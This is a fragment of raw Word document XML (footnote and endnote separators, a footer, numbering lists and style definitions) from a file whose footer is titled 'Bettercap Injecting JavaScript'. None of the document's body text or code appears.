    <w:sectPr w:rsidR="008913E0" w:rsidRPr="008913E0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076CF" w14:textId="77777777" w:rsidR="006E7A40" w:rsidRDefault="006E7A40" w:rsidP="006E7A40">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="16BF3D36" w14:textId="77777777" w:rsidR="006E7A40" w:rsidRDefault="006E7A40" w:rsidP="006E7A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578F4" w14:textId="3EBFA78E" w:rsidR="006E7A40" w:rsidRDefault="006D5306" w:rsidP="006E7A40">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:tabs>
        <w:tab w:val="center" w:pos="5040"/>
        <w:tab w:val="right" w:pos="10080"/>
      </w:tabs>
    </w:pPr>
    <w:r>
      <w:t>Bettercap</w:t>
    </w:r>
    <w:r w:rsidR="00893AC1">
      <w:t xml:space="preserve"> Injecting </w:t>
    </w:r>
    <w:r w:rsidR="00B539C2">
      <w:t>JavaScript</w:t>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:tab/>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:t>1</w:t>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:t xml:space="preserve"> of </w:t>
    </w:r>
    <w:fldSimple w:instr=" NUMPAGES ">
      <w:r w:rsidR="006E7A40">
        <w:t>2</w:t>
      </w:r>
    </w:fldSimple>
    <w:r w:rsidR="006E7A40">
      <w:tab/>
      <w:t>Revised: 0</w:t>
    </w:r>
    <w:r w:rsidR="000B37A5">
      <w:t>2</w:t>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:t>/</w:t>
    </w:r>
    <w:r w:rsidR="005275ED">
      <w:t>20</w:t>
    </w:r>
    <w:r w:rsidR="006E7A40">
      <w:t>/202</w:t>
    </w:r>
    <w:r w:rsidR="0098301A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85815" w14:textId="77777777" w:rsidR="006E7A40" w:rsidRDefault="006E7A40" w:rsidP="006E7A40">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="0141DEAE" w14:textId="77777777" w:rsidR="006E7A40" w:rsidRDefault="006E7A40" w:rsidP="006E7A4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6AFF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4170D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D982F73"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3C201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C561B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="46C2E4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2D932A4E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="46C2E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8AF4848"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3DBEF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22956AE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2EC80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BC6BB2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F044F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9D3104"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B1F6C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1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52249EE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E180A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7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8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9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101494416">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1372924740">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="259457108">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="523636289">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1569461745">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="344747808">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="228926796">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1488479867">
    <w:abstractNumId w:val="49"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="539822569">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="655688631">
    <w:abstractNumId w:val="44"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1356495933">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="256063376">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="450173360">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1695378995">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1867138058">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1405687785">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="195852412">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1705322964">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="618418792">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="358512511">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1996060090">
    <w:abstractNumId w:val="48"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="1063066083">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="1142381444">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="126972947">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="1570116804">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1097750099">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="1515269691">
    <w:abstractNumId w:val="45"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="584075480">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="1736464123">
    <w:abstractNumId w:val="47"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="1605454552">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="1499880532">
    <w:abstractNumId w:val="46"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="2103449153">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="1846556395">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="789782466">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="1436287995">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="355690776">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="746655920">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="1353801147">
    <w:abstractNumId w:val="43"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="348529813">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="153497936">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="41" w16cid:durableId="35587053">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="42" w16cid:durableId="1500581598">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="43" w16cid:durableId="102383182">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="44" w16cid:durableId="1616139268">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="45" w16cid:durableId="1857621978">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="46" w16cid:durableId="922300234">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="47" w16cid:durableId="1830245486">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="48" w16cid:durableId="663165830">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="49" w16cid:durableId="2115513142">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="50" w16cid:durableId="82383969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A9"/>
    <w:rsid w:val="00000090"/>
    <w:rsid w:val="00013441"/>
    <w:rsid w:val="00043AD7"/>
    <w:rsid w:val="00055732"/>
    <w:rsid w:val="00074C1E"/>
    <w:rsid w:val="0009235F"/>
    <w:rsid w:val="000A6714"/>
    <w:rsid w:val="000B32D2"/>
    <w:rsid w:val="000B37A5"/>
    <w:rsid w:val="000B5CF7"/>
    <w:rsid w:val="000D3B39"/>
    <w:rsid w:val="000D4263"/>
    <w:rsid w:val="000D4AE6"/>
    <w:rsid w:val="000F0DEF"/>
    <w:rsid w:val="001006B0"/>
    <w:rsid w:val="00101052"/>
    <w:rsid w:val="00102D57"/>
    <w:rsid w:val="00106DFA"/>
    <w:rsid w:val="00107E02"/>
    <w:rsid w:val="001119EB"/>
    <w:rsid w:val="00124E9E"/>
    <w:rsid w:val="0013060B"/>
    <w:rsid w:val="00140BBA"/>
    <w:rsid w:val="00142128"/>
    <w:rsid w:val="00143987"/>
    <w:rsid w:val="00143EF1"/>
    <w:rsid w:val="00155EB4"/>
    <w:rsid w:val="00163AA0"/>
    <w:rsid w:val="00165D51"/>
    <w:rsid w:val="00193A87"/>
    <w:rsid w:val="00194EC2"/>
    <w:rsid w:val="00195A4D"/>
    <w:rsid w:val="001B4534"/>
    <w:rsid w:val="001B4DC2"/>
    <w:rsid w:val="001B675F"/>
    <w:rsid w:val="001C0C5A"/>
    <w:rsid w:val="001D2365"/>
    <w:rsid w:val="001D77C8"/>
    <w:rsid w:val="001E1B63"/>
    <w:rsid w:val="001F2E2C"/>
    <w:rsid w:val="001F2E6B"/>
    <w:rsid w:val="001F42D5"/>
    <w:rsid w:val="00214234"/>
    <w:rsid w:val="00215D0C"/>
    <w:rsid w:val="0021777C"/>
    <w:rsid w:val="00222604"/>
    <w:rsid w:val="002318C1"/>
    <w:rsid w:val="0024583D"/>
    <w:rsid w:val="00257348"/>
    <w:rsid w:val="00257918"/>
    <w:rsid w:val="0026566A"/>
    <w:rsid w:val="002670E5"/>
    <w:rsid w:val="00295157"/>
    <w:rsid w:val="002A156D"/>
    <w:rsid w:val="002A43C5"/>
    <w:rsid w:val="002B4471"/>
    <w:rsid w:val="002C05FD"/>
    <w:rsid w:val="002C7E4A"/>
    <w:rsid w:val="002D0A20"/>
    <w:rsid w:val="002D5A0F"/>
    <w:rsid w:val="002F1B7D"/>
    <w:rsid w:val="002F4BA4"/>
    <w:rsid w:val="002F60B9"/>
    <w:rsid w:val="00303023"/>
    <w:rsid w:val="00304A2D"/>
    <w:rsid w:val="003106B9"/>
    <w:rsid w:val="003217DA"/>
    <w:rsid w:val="00325340"/>
    <w:rsid w:val="00330155"/>
    <w:rsid w:val="0034206E"/>
    <w:rsid w:val="00352DCC"/>
    <w:rsid w:val="00363346"/>
    <w:rsid w:val="003757AD"/>
    <w:rsid w:val="00383DA6"/>
    <w:rsid w:val="003901B6"/>
    <w:rsid w:val="003A173A"/>
    <w:rsid w:val="003A4529"/>
    <w:rsid w:val="003B5516"/>
    <w:rsid w:val="003C0E8C"/>
    <w:rsid w:val="003C55A9"/>
    <w:rsid w:val="003C592A"/>
    <w:rsid w:val="003D4B24"/>
    <w:rsid w:val="003E0B7D"/>
    <w:rsid w:val="003E18E9"/>
    <w:rsid w:val="003E4572"/>
    <w:rsid w:val="003E582B"/>
    <w:rsid w:val="003E64E1"/>
    <w:rsid w:val="003F2A26"/>
    <w:rsid w:val="003F55E9"/>
    <w:rsid w:val="003F5D1B"/>
    <w:rsid w:val="003F61E4"/>
    <w:rsid w:val="00403709"/>
    <w:rsid w:val="00414B56"/>
    <w:rsid w:val="00416C9D"/>
    <w:rsid w:val="004308B5"/>
    <w:rsid w:val="00432205"/>
    <w:rsid w:val="00433F3C"/>
    <w:rsid w:val="00435BF0"/>
    <w:rsid w:val="004665A6"/>
    <w:rsid w:val="004744E8"/>
    <w:rsid w:val="004808B0"/>
    <w:rsid w:val="00484BD1"/>
    <w:rsid w:val="00487F9A"/>
    <w:rsid w:val="004A04BC"/>
    <w:rsid w:val="004A053A"/>
    <w:rsid w:val="004A3484"/>
    <w:rsid w:val="004A5186"/>
    <w:rsid w:val="004A783E"/>
    <w:rsid w:val="004B1121"/>
    <w:rsid w:val="004B1659"/>
    <w:rsid w:val="004B38F2"/>
    <w:rsid w:val="004B4D15"/>
    <w:rsid w:val="004B4EDA"/>
    <w:rsid w:val="004B584E"/>
    <w:rsid w:val="004C0030"/>
    <w:rsid w:val="004C7DC3"/>
    <w:rsid w:val="004D1B22"/>
    <w:rsid w:val="004D2BF9"/>
    <w:rsid w:val="004F0A16"/>
    <w:rsid w:val="004F0DD7"/>
    <w:rsid w:val="00516513"/>
    <w:rsid w:val="00516A81"/>
    <w:rsid w:val="00517481"/>
    <w:rsid w:val="00517CB6"/>
    <w:rsid w:val="005275ED"/>
    <w:rsid w:val="005415AF"/>
    <w:rsid w:val="005640D7"/>
    <w:rsid w:val="00586D2B"/>
    <w:rsid w:val="0059788E"/>
    <w:rsid w:val="005A33CF"/>
    <w:rsid w:val="005A7480"/>
    <w:rsid w:val="005C2F9F"/>
    <w:rsid w:val="005D3A9F"/>
    <w:rsid w:val="005D3BEB"/>
    <w:rsid w:val="005D4012"/>
    <w:rsid w:val="005E5850"/>
    <w:rsid w:val="00603570"/>
    <w:rsid w:val="00611FE3"/>
    <w:rsid w:val="00612369"/>
    <w:rsid w:val="00621AD3"/>
    <w:rsid w:val="006309C8"/>
    <w:rsid w:val="006310BB"/>
    <w:rsid w:val="00632217"/>
    <w:rsid w:val="0063684D"/>
    <w:rsid w:val="00637535"/>
    <w:rsid w:val="00637D48"/>
    <w:rsid w:val="00640EB0"/>
    <w:rsid w:val="00646D13"/>
    <w:rsid w:val="006516E0"/>
    <w:rsid w:val="0066441F"/>
    <w:rsid w:val="00673346"/>
    <w:rsid w:val="00687AC0"/>
    <w:rsid w:val="00693527"/>
    <w:rsid w:val="006A6B29"/>
    <w:rsid w:val="006B57CB"/>
    <w:rsid w:val="006C0FF5"/>
    <w:rsid w:val="006C3564"/>
    <w:rsid w:val="006C75F6"/>
    <w:rsid w:val="006D4B79"/>
    <w:rsid w:val="006D5306"/>
    <w:rsid w:val="006E4721"/>
    <w:rsid w:val="006E7A40"/>
    <w:rsid w:val="006F5CE2"/>
    <w:rsid w:val="007002F6"/>
    <w:rsid w:val="00712F1A"/>
    <w:rsid w:val="007216F2"/>
    <w:rsid w:val="00721D14"/>
    <w:rsid w:val="00725566"/>
    <w:rsid w:val="00772396"/>
    <w:rsid w:val="00775E7E"/>
    <w:rsid w:val="007816FB"/>
    <w:rsid w:val="007874F3"/>
    <w:rsid w:val="00792D78"/>
    <w:rsid w:val="007A3504"/>
    <w:rsid w:val="007A48AA"/>
    <w:rsid w:val="007A669C"/>
    <w:rsid w:val="007C0D4D"/>
    <w:rsid w:val="007D37D0"/>
    <w:rsid w:val="007D49A9"/>
    <w:rsid w:val="007E16A5"/>
    <w:rsid w:val="007E20D4"/>
    <w:rsid w:val="007E5AF6"/>
    <w:rsid w:val="007F1CD3"/>
    <w:rsid w:val="007F5792"/>
    <w:rsid w:val="00803366"/>
    <w:rsid w:val="0080641F"/>
    <w:rsid w:val="008071B9"/>
    <w:rsid w:val="0081268F"/>
    <w:rsid w:val="00813996"/>
    <w:rsid w:val="00817D71"/>
    <w:rsid w:val="00826B8B"/>
    <w:rsid w:val="00827459"/>
    <w:rsid w:val="008277A0"/>
    <w:rsid w:val="00840459"/>
    <w:rsid w:val="008429DF"/>
    <w:rsid w:val="00845AC2"/>
    <w:rsid w:val="00845EB3"/>
    <w:rsid w:val="00850D3F"/>
    <w:rsid w:val="00851740"/>
    <w:rsid w:val="00864790"/>
    <w:rsid w:val="00866039"/>
    <w:rsid w:val="008675F5"/>
    <w:rsid w:val="00870632"/>
    <w:rsid w:val="00874941"/>
    <w:rsid w:val="00881D8B"/>
    <w:rsid w:val="00886AAF"/>
    <w:rsid w:val="008913E0"/>
    <w:rsid w:val="00893AC1"/>
    <w:rsid w:val="00897986"/>
    <w:rsid w:val="008A109C"/>
    <w:rsid w:val="008A7FD6"/>
    <w:rsid w:val="008B2758"/>
    <w:rsid w:val="008C056E"/>
    <w:rsid w:val="008C0D5E"/>
    <w:rsid w:val="008D25FE"/>
    <w:rsid w:val="008D2C60"/>
    <w:rsid w:val="008D39C5"/>
    <w:rsid w:val="008D3B9B"/>
    <w:rsid w:val="008D47B2"/>
    <w:rsid w:val="008D4888"/>
    <w:rsid w:val="008E073E"/>
    <w:rsid w:val="008E1A72"/>
    <w:rsid w:val="008E35C9"/>
    <w:rsid w:val="008E7080"/>
    <w:rsid w:val="00905DE3"/>
    <w:rsid w:val="009111AA"/>
    <w:rsid w:val="0092076D"/>
    <w:rsid w:val="0092199B"/>
    <w:rsid w:val="00922805"/>
    <w:rsid w:val="00924504"/>
    <w:rsid w:val="00927265"/>
    <w:rsid w:val="009315BF"/>
    <w:rsid w:val="00936993"/>
    <w:rsid w:val="00943E78"/>
    <w:rsid w:val="00955A01"/>
    <w:rsid w:val="009653A4"/>
    <w:rsid w:val="00974F70"/>
    <w:rsid w:val="00976033"/>
    <w:rsid w:val="009829CA"/>
    <w:rsid w:val="0098301A"/>
    <w:rsid w:val="00986681"/>
    <w:rsid w:val="00987055"/>
    <w:rsid w:val="009918F3"/>
    <w:rsid w:val="00995737"/>
    <w:rsid w:val="009A055F"/>
    <w:rsid w:val="009C18D9"/>
    <w:rsid w:val="009D3A71"/>
    <w:rsid w:val="009D4827"/>
    <w:rsid w:val="009D53CE"/>
    <w:rsid w:val="009E7283"/>
    <w:rsid w:val="009E775F"/>
    <w:rsid w:val="009F64B3"/>
    <w:rsid w:val="00A02A0F"/>
    <w:rsid w:val="00A1734E"/>
    <w:rsid w:val="00A23C0D"/>
    <w:rsid w:val="00A24B6B"/>
    <w:rsid w:val="00A305EA"/>
    <w:rsid w:val="00A5227F"/>
    <w:rsid w:val="00A555FB"/>
    <w:rsid w:val="00A55BC1"/>
    <w:rsid w:val="00A57F21"/>
    <w:rsid w:val="00A608FE"/>
    <w:rsid w:val="00A63AD4"/>
    <w:rsid w:val="00A63CD0"/>
    <w:rsid w:val="00A651B5"/>
    <w:rsid w:val="00A658AA"/>
    <w:rsid w:val="00A73A1F"/>
    <w:rsid w:val="00A817B7"/>
    <w:rsid w:val="00A86A36"/>
    <w:rsid w:val="00A91067"/>
    <w:rsid w:val="00AA3CC3"/>
    <w:rsid w:val="00AC75A4"/>
    <w:rsid w:val="00AC768A"/>
    <w:rsid w:val="00AD5300"/>
    <w:rsid w:val="00AE46DA"/>
    <w:rsid w:val="00AF063E"/>
    <w:rsid w:val="00AF37CB"/>
    <w:rsid w:val="00AF3950"/>
    <w:rsid w:val="00B025A4"/>
    <w:rsid w:val="00B14597"/>
    <w:rsid w:val="00B15295"/>
    <w:rsid w:val="00B15D1A"/>
    <w:rsid w:val="00B20F4D"/>
    <w:rsid w:val="00B41B53"/>
    <w:rsid w:val="00B4373D"/>
    <w:rsid w:val="00B52A46"/>
    <w:rsid w:val="00B539C2"/>
    <w:rsid w:val="00B63558"/>
    <w:rsid w:val="00B650DD"/>
    <w:rsid w:val="00B7186A"/>
    <w:rsid w:val="00B72314"/>
    <w:rsid w:val="00BA06A2"/>
    <w:rsid w:val="00BA6305"/>
    <w:rsid w:val="00BB5260"/>
    <w:rsid w:val="00BC344E"/>
    <w:rsid w:val="00BC49DE"/>
    <w:rsid w:val="00BD0154"/>
    <w:rsid w:val="00BD192B"/>
    <w:rsid w:val="00BD4054"/>
    <w:rsid w:val="00BF214F"/>
    <w:rsid w:val="00BF73D5"/>
    <w:rsid w:val="00C039F5"/>
    <w:rsid w:val="00C06609"/>
    <w:rsid w:val="00C07E44"/>
    <w:rsid w:val="00C1178D"/>
    <w:rsid w:val="00C1510D"/>
    <w:rsid w:val="00C35C40"/>
    <w:rsid w:val="00C474A9"/>
    <w:rsid w:val="00C537AA"/>
    <w:rsid w:val="00C62107"/>
    <w:rsid w:val="00C71C0D"/>
    <w:rsid w:val="00C71D52"/>
    <w:rsid w:val="00C7451A"/>
    <w:rsid w:val="00C81780"/>
    <w:rsid w:val="00C85832"/>
    <w:rsid w:val="00C911DE"/>
    <w:rsid w:val="00CA25D8"/>
    <w:rsid w:val="00CA56EC"/>
    <w:rsid w:val="00CA7D5B"/>
    <w:rsid w:val="00CB33BE"/>
    <w:rsid w:val="00CB5248"/>
    <w:rsid w:val="00CC6FDE"/>
    <w:rsid w:val="00CD7F55"/>
    <w:rsid w:val="00CE2186"/>
    <w:rsid w:val="00CE51FE"/>
    <w:rsid w:val="00D009A4"/>
    <w:rsid w:val="00D03763"/>
    <w:rsid w:val="00D0638A"/>
    <w:rsid w:val="00D07D3C"/>
    <w:rsid w:val="00D12984"/>
    <w:rsid w:val="00D13EF3"/>
    <w:rsid w:val="00D14482"/>
    <w:rsid w:val="00D15809"/>
    <w:rsid w:val="00D1604B"/>
    <w:rsid w:val="00D167B2"/>
    <w:rsid w:val="00D23EB5"/>
    <w:rsid w:val="00D26091"/>
    <w:rsid w:val="00D26A70"/>
    <w:rsid w:val="00D314BB"/>
    <w:rsid w:val="00D32C3D"/>
    <w:rsid w:val="00D34093"/>
    <w:rsid w:val="00D44D0F"/>
    <w:rsid w:val="00D459D0"/>
    <w:rsid w:val="00D51C7A"/>
    <w:rsid w:val="00D52BF8"/>
    <w:rsid w:val="00D55293"/>
    <w:rsid w:val="00D62270"/>
    <w:rsid w:val="00D7064B"/>
    <w:rsid w:val="00D73D8E"/>
    <w:rsid w:val="00D76F92"/>
    <w:rsid w:val="00D81BD5"/>
    <w:rsid w:val="00D83882"/>
    <w:rsid w:val="00D83D34"/>
    <w:rsid w:val="00DA3025"/>
    <w:rsid w:val="00DA4FCD"/>
    <w:rsid w:val="00DA7AC9"/>
    <w:rsid w:val="00DA7C60"/>
    <w:rsid w:val="00DB1B74"/>
    <w:rsid w:val="00DB3379"/>
    <w:rsid w:val="00DB3C0B"/>
    <w:rsid w:val="00DB78EE"/>
    <w:rsid w:val="00DC77C0"/>
    <w:rsid w:val="00DD5FF7"/>
    <w:rsid w:val="00DD7296"/>
    <w:rsid w:val="00DE39EB"/>
    <w:rsid w:val="00DF4A32"/>
    <w:rsid w:val="00E0045F"/>
    <w:rsid w:val="00E00C97"/>
    <w:rsid w:val="00E06D19"/>
    <w:rsid w:val="00E14F7A"/>
    <w:rsid w:val="00E16F9D"/>
    <w:rsid w:val="00E26D09"/>
    <w:rsid w:val="00E4416E"/>
    <w:rsid w:val="00E50485"/>
    <w:rsid w:val="00E50C42"/>
    <w:rsid w:val="00E65300"/>
    <w:rsid w:val="00E8194A"/>
    <w:rsid w:val="00EA0DF0"/>
    <w:rsid w:val="00EA1A2A"/>
    <w:rsid w:val="00EA3B2C"/>
    <w:rsid w:val="00ED0838"/>
    <w:rsid w:val="00ED27F2"/>
    <w:rsid w:val="00ED69B8"/>
    <w:rsid w:val="00EE196B"/>
    <w:rsid w:val="00F02967"/>
    <w:rsid w:val="00F1370D"/>
    <w:rsid w:val="00F16D8F"/>
    <w:rsid w:val="00F17E2D"/>
    <w:rsid w:val="00F24480"/>
    <w:rsid w:val="00F27B22"/>
    <w:rsid w:val="00F31E5C"/>
    <w:rsid w:val="00F34999"/>
    <w:rsid w:val="00F37AED"/>
    <w:rsid w:val="00F432F5"/>
    <w:rsid w:val="00F7405B"/>
    <w:rsid w:val="00F86EA0"/>
    <w:rsid w:val="00F9280B"/>
    <w:rsid w:val="00FA158B"/>
    <w:rsid w:val="00FB298C"/>
    <w:rsid w:val="00FB2FE9"/>
    <w:rsid w:val="00FD4A3C"/>
    <w:rsid w:val="00FE01C1"/>
    <w:rsid w:val="00FE2AE3"/>
    <w:rsid w:val="00FE66DB"/>
    <w:rsid w:val="00FF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60AA8"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{2B7919BD-FEEE-4D72-A5ED-E8A9992B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F55"/>
    <w:pPr>
      <w:spacing w:before="160" w:after="80" w:line="336" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdan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CD7F55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CD7F55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CD7F55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CD7F5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D7F55"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading3Char">
    <w:name w:val="Heading 3 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading3"/>
    <w:rsid w:val="00FF7FC1"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00FF7FC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co4">
    <w:name w:val="co4"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="002F1B7D"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="kw2">
    <w:name w:val="kw2"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="002F1B7D"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="re5">
    <w:name w:val="re5"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="002F1B7D"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="nu0">
    <w:name w:val="nu0"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="002F1B7D"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="br0">
    <w:name w:val="br0"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="002F1B7D"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading1"/>
    <w:rsid w:val="00640EB0"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Arial Unicode MS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640EB0"/>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:iCs/>
      <w:sz w:val="24"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:rsid w:val="00CD7F55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640EB0"/>
    <w:rPr>
      <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:rsid w:val="00CD7F55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640EB0"/>
    <w:rPr>
      <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Times New Roman"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Outlinenumbering">
    <w:name w:val="Outline numbering"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00CD7F55"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="360"/>
        <w:tab w:val="num" w:pos="720"/>
      </w:tabs>
      <w:ind w:left="720"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="NumberedHeading2">
    <w:name w:val="Numbered Heading 2"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="00CD7F55"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="PageNumber">
    <w:name w:val="page number"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00CD7F55"/>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00CD7F55"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
